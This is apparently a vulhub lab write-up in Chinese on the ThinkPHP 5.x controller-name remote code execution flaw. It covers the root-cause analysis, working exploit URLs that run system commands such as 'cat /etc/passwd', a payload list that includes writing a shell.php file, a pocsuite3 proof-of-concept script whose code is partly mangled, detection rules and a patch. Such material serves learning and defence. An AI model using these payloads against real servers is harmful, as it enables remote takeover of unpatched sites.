# ThinkPHP5 5.0.x/5.1.x 远程代码执行漏洞  

**本文章适合正在利用vulhub进行漏洞复现的朋友，或者准备学习漏洞复现的朋友，大佬就可以绕过了，写的比较基础。我也是一个小白，总结一下对于vulhub的使用技巧和一些漏洞原理，也分享一些自己觉得好用的方法给大家，欢迎大家帮我补充，有什么好用的技巧也可以分享一下，大家共同进步。本篇有自己的理解，如果有什么不对的或者不好的地方希望大家不要喷我，但是欢迎帮我指正。最后希望大家可以关注我的专栏。**  

## 1.漏洞描述：

ThinkPHP是一款运用极广的PHP开发框架。其版本5.0.x/5.1.x中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。

## 2.漏洞原理：

这里选择对vulhub中 thinkphp5.0.20版本漏洞进行分析，关键函数开头。

由于没有在配置文件定义任何路由，所以默认按照方式1解析调度。如果开启强制路由模式，会直接抛出错误。进入docker实例环境中查看thinkphp源代码如下。

 **thinkphp/library/think/App.php**  

**![image.png](https://image.3001.net/images/20191211/1576045968_5df08d903f5af.png!small)  
**

 **可以看到tp5在解析URL的时候只是将URL按分割符分割，并没有进行安全检测。继续往下看  
**

 **thinkphp/library/think/Route.php  
**

  

  
  

![image.png](https://image.3001.net/images/20191211/1576046170_5df08e5a64217.png!small)

在攻击时注意使用一个已存在的module，否则会抛出异常，无法继续运行。  
 **thinkphp/library/think/App.php**  
![image.png](https://image.3001.net/images/20191211/1576046222_5df08e8e82947.png!small)

此处在获取控制器名时直接从之前的解析结果中获取，无任何安全检查。  
**thinkphp/library/think/App.php**![image.png](https://image.3001.net/images/20191211/1576046277_5df08ec514218.png!small)

在这里对控制器类进行实例化，再往下看。  
 **thinkphp/library/think/App.php**  

**![image.png](https://image.3001.net/images/20191211/1576046563_5df08fe35799d.png!small)  
**

根据传入的name获取对应的类，如果存在就直接返回这个类的一个实例化对象  

 **thinkphp/library/think/Loader.php**

**![image.png](https://image.3001.net/images/20191211/1576046613_5df09015c14ce.png!small)**查看`
**getModuleAndClass**` 方法：可以看到如果控制器名中有`\`，就直接返回。

**thinkphp/library/think/Loader.php**![image.png](https://image.3001.net/images/20191211/1576046761_5df090a92bd7e.png!small)
回到`thinkphp/library/think/App.php`的`module`方法，正常情况下应该获取到对应控制器类的实例化对象，而我们现在得到了一个`\think\App`的实例化对象，进而通过url调用其任意的public方法，同时解析url中的额外参数，当作方法的参数传入。  

**thinkphp/library/think/App.php**![image.png](https://image.3001.net/images/20191211/1576046819_5df090e39dcda.png!small)  

## 3.漏洞利用：

进入我们的vulhub目中搭建漏洞环境

注意我们这里的thinkphp版本为

 **thinkphp 5.0.20  
**

**![image.png](https://image.3001.net/images/20191211/1576046968_5df09178d65aa.png!small)  
**

 **打开浏览器  
**

 **<http://your-ip/index.php?s=index/>\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1  
**

**![image.png](https://image.3001.net/images/20191211/1576047070_5df091de6095b.png!small)  
**

我们尝试去执行命令  

 **<http://your-ip/index.php?s=/Index/>\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat
/etc/passwd  
**

 **<http://your-ip/index.php?s=/Index/>\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=cat
/etc/passwd![image.png](https://image.3001.net/images/20191211/1576047168_5df092400434f.png!small)  
**

突然间想起来在之前的攻防演练中，利用的thinkphp版本为5.1  

 **thinkphp 5.1  
**

**![image.png](https://image.3001.net/images/20191211/1576047253_5df092959adc1.png!small)  
**

 **利用的payload的为  
**

 **<http://your-ip/index.php?s=index/think>\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls
-al  
**

## 4.POC编写：

对于payload的总结

5.1.x php版本>5.5  
  
---  
http://your-ip/index.php?s=index/think\request/input?data[]=phpinfo()&filter=assert  
http://your-ip/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()  
http://your-ip/index.php?s=index/\think\template\driver\file/write?cacheFile=shell.php&content=();?>  
  
  
  
  

  

5.0.x php版本>=5.4  
  
---  
http://your-ip/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()  
  
  
 **以上该payload来源于<https://xz.aliyun.com/t/3570>  
**

但是在vulhub环境中，thinkphp版本为5.0.20，对于5.0.x的payload并不能执行成功，在该版本推荐大家使用以下payload

  

5.0.20 php版本>=5.4  
  
---  
<http://your-ip/index.php?s=index/think>\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1  
<http://your-ip/index.php?s=index/think>\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1  
  
      
    
    from collections import OrderedDict  
    import requests  
    from pocsuite3.api import Output, POCBase, OptString, register_poc, POC_CATEGORY, OptDict  
      
      
    class thinkphpPOC(POCBase):  
        vulID = '004'  # ssvid  
        version = '1.0'  
        author = ['xssle']  
        vulDate = '2019-10-09'  
        createDate = '2019-10-09'  
        updateDate = '2019-10-09'  
        references = ['https://www.seebug.org/vuldb/ssvid-97181']  
        name = 'thinkphp 5.x全版本任意代码执行'  
        appPowerLink = 'http://www.thinkphp.cn/topic/60390.html'  
        appName = 'thinkphp'  
        appVersion = '5.x'  
        vulType = 'Code execution'  
        desc = '''  
          ThinkPHP是一款运用极广的PHP开发框架。其版本5中，由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程代码执行漏洞。  
       '''  
        samples = []  
        install_requires = []  
        category = POC_CATEGORY.EXPLOITS.WEBAPP  
        protocol = POC_CATEGORY.PROTOCOL.HTTP  
      
    def _verify(self):  
            result = {}  
            exp = [  
    "/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",  
    "/index.php?s=/index/think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1",  
    "/index.php?s=InDeX/think\\App/invoKeFunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1""  
                "/index.php?s=index/think\\request/input?data[]=phpinfo()&filter=assert",  
    "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()",  
    "/index.php?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=phpinfo()"  
                ]  
            get_headers = {  
    'Proxy-Connection': 'keep-alive',  
    'Upgrade-Insecure-Requests': '1',  
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36',  
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',  
    'Accept-Encoding': 'gzip, deflate',  
    'Accept-Language': 'zh-CN,zh;q=0.9'  
            }  
            vul_url = self.url  
    if vul_url.endswith('/'):  
                vul_url = vul_url[:-1]  
    if "http://" in vul_url:  
                host = vul_url[7:]  
    elif "https://" in vul_url:  
                host = vul_url[8:]  
    else:  
                host = vul_url  
            get_headers['Host'] = host  
    for i in exp:  
                payloadurl = vul_url + i  
                r = requests.get(url=payloadurl, headers=get_headers)  
    try:  
                    if r.status_code == 200 and "<title>phpinfo()</title>" in r.text:  
                        result['VerifyInfo'] = {}  
                        result['VerifyInfo']['URL'] = payloadurl  
    return self.parse_output(result)  
    except Exception as ex:  
            pass  
      
      
    def _attack(self):  
        return self._verify()  
      
      
    def parse_output(self, result):  
        output = Output(self)  
    if result:  
            output.success(result)  
    else:  
            output.fail('target is not vulnerable')  
    return output  
      
      
    register_poc(thinkphpPOC)

  

**![image.png](https://image.3001.net/images/20191211/1576048084_5df095d49d70d.png!small)  
**

## 5.漏洞规则总结：

在漏洞规则检测方面要注意大小写和斜杠绕过，要利用正则进行全方面的匹配

规则  
---  
s=/Index/\think\app/invokefunction  
s=Index/\think\app/invokefunction  
s=index/\think\app/invokefunction  
s=index/think\app/invokefunction  
s=index/think\request  
s=index/\think\template\driver\file  
  
  
## 6.漏洞防御：

直接添加补丁，在thinkphp5.0版本的thinkphp/library/think/App.php554行，thinkphp5.1版本的thinkphp/library/think/route/dispatch/Url.php63行添加如下代码：  

    
    
    if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
           throw new HttpException(404, 'controller not exists:' . $controller);
       }  
    

  

